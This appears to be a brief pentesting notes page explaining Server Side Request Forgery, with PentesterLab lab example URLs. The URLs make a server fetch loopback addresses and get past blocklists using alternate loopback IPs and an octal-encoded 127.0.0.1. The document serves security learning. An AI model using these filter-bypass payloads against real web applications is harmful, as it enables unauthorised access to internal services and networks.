# Server Side Request Forgery

A Server Side Request Forgery vulnerability allows an attacker to use a functionality of the web application to gain access to internal resources. Basically, we are going to get the server to make HTTP requests (or over protocols) on our behalf.

This can be used to access internal pages, perform network scans, trigger behaviours in different systems...

<pre class="language-applescript"><code class="lang-applescript">##pentesterlab (labs)
# find ssrf in redirect url xyz.com/?url= ssrf
libcurl.me/?url=http://127.0.0.1:1234

# the developer blocked the attack by blocking 127.0.0.1.
libcurl.me/?url=http://localhost:1234

#the developer blocked  attack by blocking 127.0.0.1 and localhost
<strong>                      [they are som many ways to do like 127.0.0.4 or 127.0.0.5]
</strong>libcurl.me/?url=http://127.0.0.2:1234
or
To do convert an IPv4 address like 127.0.0.1 into a single-integer octal equivalent value
127.0.0.1 &#x3C;convert> 017700000001

libcurl.me/?url=http://017700000001:1234/
</code></pre>

